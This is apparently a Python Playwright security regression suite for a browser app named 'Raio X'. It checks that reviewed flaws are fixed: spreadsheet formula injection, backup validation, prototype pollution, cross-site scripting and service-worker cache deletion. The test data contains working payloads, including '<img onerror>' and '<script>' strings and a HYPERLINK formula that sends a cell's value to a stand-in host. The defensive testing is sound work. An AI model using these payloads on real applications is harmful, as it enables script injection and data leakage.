"""Regressao de seguranca (parecer docs/04_seguranca/revisao-etapa1.md: M-1, M-2, M-3, M-4, B-1, B-6).
Escrita so a partir da especificacao e do parecer; usa o app so pelo navegador."""
import json, re, html, zipfile
import pytest
from conftest import URL
from test_etapa1 import (carregar, backup, abrir_config, abrir_painel, gerar_excel, abrir_xlsx,
                         codigos_no_backup)


def restaurar(page, texto, modo="Substituir"):
    abrir_config(page)
    with page.expect_file_chooser() as fc:
        page.get_by_role("button", name="Restaurar backup").click()
    fc.value.set_files([{"name": "historico_RaioX_2026-11-25.json", "mimeType": "application/json",
                         "buffer": texto.encode()}])
    page.wait_for_timeout(500)
    btn = page.get_by_role("button", name=modo, exact=True)
    if btn.count():
        btn.first.click()
    page.wait_for_timeout(800)


def csv_tmp(tmp_path, nome, texto):
    p = tmp_path / nome
    p.write_text(texto, encoding="utf-8")
    return p


def erros_pagina(page):
    erros = []
    page.on("pageerror", lambda e: erros.append(str(e)))
    return erros


# ---------- M-1 ----------
def test_SEG_M1_backup_com_formula_e_hyperlink_nao_vira_celula_ativa(page, tmp_path):
    carregar(page, "vendas.csv")
    _, b = backup(page)
    d = json.loads(b)
    d["registros"][0]["v"]["Cliente"] = {"formula": 'HYPERLINK("http://exemplo.invalido/?"&A2,"ver")'}
    d["registros"][1]["v"]["Cliente"] = {"text": "x", "hyperlink": "http://exemplo.invalido/"}
    d["registros"][2]["v"]["Região"] = {"formula": "1+1"}
    page.get_by_role("button", name="Apagar todos os dados").click()
    page.get_by_role("button", name="Apagar", exact=True).click()
    page.wait_for_timeout(500)
    restaurar(page, json.dumps(d))
    dl = gerar_excel(page)
    wb = abrir_xlsx(dl, tmp_path)
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                assert c.data_type != "f", f"formula em {ws.title}!{c.coordinate}"
                assert c.hyperlink is None, f"hyperlink em {ws.title}!{c.coordinate}"
    with zipfile.ZipFile(tmp_path / dl.suggested_filename) as z:
        for n in z.namelist():
            if n.startswith("xl/worksheets/") and n.endswith(".xml"):
                x = z.read(n).decode("utf-8", "ignore")
                assert not re.search(r"<f[ >/]", x), f"<f> em {n}"
                assert "<hyperlink" not in x, f"hyperlink em {n}"
                assert "HYPERLINK(" not in x.upper()


# ---------- M-3 ----------
@pytest.mark.parametrize("ruim", [
    "isto nao e json {{{",
    json.dumps({"app": "raiox", "formato": 1, "registros": [{"conjunto": "vendas", "codigo": "X1", "v": {}}, None]}),
    json.dumps({"app": "raiox", "formato": 1, "registros": [{"conjunto": "vendas", "v": {"a": "b"}}]}),
    json.dumps({"app": "raiox", "formato": 1, "registros": [{"conjunto": "vendas", "codigo": "X1", "v": "texto"}]}),
    json.dumps({"app": "raiox", "formato": 1, "registros": [], "conjs": {"vendas": {"campos": "nao-lista"}}}),
    json.dumps({"app": "raiox", "formato": 1, "registros": [], "fmts": {"K": {"conjunto": "v", "cols": 5}}}),
])
def test_SEG_M3_restaurar_backup_invalido_mantem_dados(page, ruim):
    erros = erros_pagina(page)
    carregar(page, "vendas.csv")
    _, antes = backup(page)
    n = len(set(codigos_no_backup(antes)))
    assert n > 0
    restaurar(page, ruim)
    corpo = page.inner_text("body")
    assert re.search(r"não é um backup|inválid|erro|não foi possível", corpo, re.I), \
        "deveria mostrar mensagem de erro (parecer: 'Esse arquivo não é um backup do Raio X')"
    _, depois = backup(page)
    assert len(set(codigos_no_backup(depois))) == n, "dados anteriores devem continuar"
    # o app continua abrindo
    abrir_painel(page)
    abrir_config(page)
    assert erros == []


# ---------- M-4 ----------
def test_SEG_M4_nomes_de_campo_e_arquivo_perigosos_importam(page, tmp_path):
    erros = erros_pagina(page)
    p = csv_tmp(tmp_path, "__proto__.csv",
                "__proto__;Codigo;constructor;toString\nvalorP1;K001;valorC1;valorT1\nvalorP2;K002;valorC2;valorT2\n")
    carregar(page, p)
    page.wait_for_timeout(500)
    _, b = backup(page)
    for v in ["valorP1", "valorC1", "valorT1", "valorP2", "K001", "K002"]:
        assert v in b, f"{v} sumiu do backup"
    assert erros == []
    abrir_painel(page)
    assert "K001" in page.inner_text("body") or "Registros" in page.inner_text("body")


def test_SEG_M4_backup_com_proto_nao_polui_object_prototype(page):
    erros = erros_pagina(page)
    carregar(page, "vendas.csv")
    _, b = backup(page)
    suja = b.replace('"cfg":{', '"cfg":{"__proto__":{"polluted":1},', 1)
    suja = suja.replace('"conjs":{', '"conjs":{"__proto__":{"polluted":1},', 1)
    suja = suja.replace('"fmts":{', '"fmts":{"__proto__":{"polluted":1},', 1)
    suja = suja.replace('"app":"raiox"', '"app":"raiox","__proto__":{"polluted":1}', 1)
    restaurar(page, suja)
    assert page.evaluate("({}).polluted === undefined")
    # os dados do backup continuam acessiveis
    _, depois = backup(page)
    assert len(set(codigos_no_backup(depois))) == len(set(codigos_no_backup(b)))
    assert erros == []


# ---------- B-1 / CA-100 ----------
def test_SEG_B1_CA100_html_e_script_viram_texto(page, tmp_path):
    dialogos = []
    page.on("dialog", lambda d: (dialogos.append(d.message), d.dismiss()))
    img = "<img src=x onerror=window.__xss=1>"
    scr = "<script>window.__xss=1</script>"
    p = csv_tmp(tmp_path, f"{img}.csv", f"Código;Cliente;{scr}\nV00001;{img};{scr}\nV00002;Normal;{img}\n")
    carregar(page, p)
    abrir_painel(page)
    page.wait_for_timeout(600)
    corpo = page.inner_text("body")
    assert img in corpo
    assert page.evaluate("window.__xss === undefined")
    assert page.locator("img[src=x]").count() == 0
    assert dialogos == []
    abrir_config(page)
    page.wait_for_timeout(300)
    assert page.evaluate("window.__xss === undefined")
    assert page.locator("img[src=x]").count() == 0


# ---------- B-6 ----------
def test_SEG_B6_rodape_do_excel_mostra_e_comercial_literal(page, tmp_path):
    carregar(page, "vendas.csv")
    abrir_config(page)
    page.get_by_label("Cliente", exact=True).fill("A & B")
    page.wait_for_timeout(400)
    dl = gerar_excel(page)
    destino = tmp_path / dl.suggested_filename
    dl.save_as(str(destino))
    achou = False
    with zipfile.ZipFile(destino) as z:
        for n in z.namelist():
            if n.startswith("xl/worksheets/") and n.endswith(".xml"):
                x = z.read(n).decode("utf-8", "ignore")
                for m in re.findall(r"<oddFooter>(.*?)</oddFooter>", x, re.S):
                    t = html.unescape(m)
                    if "A" in t and "B" in t and re.search(r"A &+ B", t):
                        achou = True
                        # no codigo de cabecalho do Excel, '&&' e o '&' literal; '& B' sozinho seria codigo
                        assert "A && B" in t, f"'&' nao escapado no rodape: {t!r}"
    assert achou, "rodape com 'A & B' nao encontrado"


# ---------- M-2 (parte do app) ----------
def test_SEG_M2_service_worker_nao_apaga_cache_de_outro_app(page):
    """Simula 'versao nova': desregistra o SW e cria caches velhos; ao reinstalar, o activate roda de novo.
    Cache 'raiox-*' antigo pode sumir; o de outro app deve ficar."""
    page.evaluate("navigator.serviceWorker.ready.then(()=>1)")
    page.evaluate("""async()=>{
      for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister();
      await caches.open('outro-app-v1'); await caches.open('raiox-v0-antigo');}""")
    page.reload()
    page.wait_for_function("navigator.serviceWorker.getRegistration().then(r=>!!(r&&r.active))")
    page.wait_for_timeout(1500)
    nomes = page.evaluate("caches.keys()")
    if "raiox-v0-antigo" in nomes:
        pytest.skip(f"activate nao rodou neste ambiente (caches: {nomes}); nao da para simular versao nova")
    assert "outro-app-v1" in nomes, f"cache de outro app apagado pelo SW: {nomes}"
